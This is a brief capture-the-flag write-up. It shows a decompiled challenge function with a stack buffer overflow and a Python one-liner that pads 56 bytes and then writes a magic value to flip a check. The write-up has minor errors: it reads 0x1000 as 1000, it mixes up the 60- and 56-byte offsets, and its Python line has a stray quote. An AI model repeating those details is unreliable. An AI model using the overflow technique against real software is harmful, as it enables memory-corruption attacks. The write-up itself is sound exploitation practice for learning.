From this, i found the vulnerability and added comments 
```c
undefined8 challenge(void)
{
  // ... canary setup ...
  undefined8 local_58;  // buffer starts here
  undefined8 local_50;
  undefined8 local_48;

  // read UP TO 0x1000 bytes into a 64-byte buffer
  read(0, &local_58, 0x1000);
  
  // check condnts
  if (local_20._4_4_ != 0) {  // Upper 4 bytes of local_20 must be 0
    puts("Lose variable is set! Quitting!");

```
Here,
- buffer size is 64 bytes
- read() accepts upto 1000 bytes in a 64 byte buffer
- win `0x5a3c1e5a`

So i basically had to add a 60 byte buffer and have the last 4 bytes be `0x5a3c1e5a` in little endian which is `\x5a\x1e\x3c\x5a`

I used this paylaod
```python
import sys
sys.stdout.buffer.write(b"A"*56 + b"\x5a\x1e\x3c\x5a")'
```
